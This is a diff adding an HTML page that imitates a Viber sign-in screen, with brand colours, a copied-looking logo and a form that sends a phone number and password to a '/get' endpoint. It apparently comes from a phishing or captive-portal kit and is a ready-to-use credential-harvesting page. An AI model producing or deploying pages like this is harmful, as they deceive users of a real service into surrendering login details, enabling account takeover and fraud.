@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Viber</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+        background-color: #7b519d;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 380px;
+        background: #fff;
+        border-radius: 16px;
+        padding: 40px 32px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 20px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #7b519d;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 2px solid #e0e0e0;
+        border-radius: 12px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #7b519d;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #7b519d;
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #694589;
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 13px;
+        color: #666;
+      }
+      .footer a {
+        color: #7b519d;
+        text-decoration: none;
+        font-weight: 600;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 80 80" width="60" height="60">
+        <path d="M40 8c-17.7 0-32 12.5-32 28s14.3 28 32 28c4.4 0 8.5-.8 12.2-2.2l7.4 3.7-2.1-6.7C66.5 55.2 72 48 72 40 72 24.5 57.7 12 40 12V8z" fill="#7b519d"/>
+        <path d="M28 32c0-1.1.9-2 2-2h20c1.1 0 2 .9 2 2v16c0 1.1-.9 2-2 2H30c-1.1 0-2-.9-2-2V32z" fill="#fff"/>
+        <circle cx="35" cy="40" r="2" fill="#7b519d"/>
+        <circle cx="45" cy="40" r="2" fill="#7b519d"/>
+      </svg>
+      <h1 class="g-h1">Viber</h1>
+      <p class="g-h2">Enter your phone number to connect</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="tel" name="phone" placeholder="+1 234 567 8900" required>
+        <input class="g-input" type="password" name="password" placeholder="Password (optional)">
+        <button type="submit" class="gbtn-primary">Continue</button>
+      </form>
+      <p class="footer">Don't have Viber? <a href="#">Get it free</a></p>
+    </div>
+  </body>
+</html>
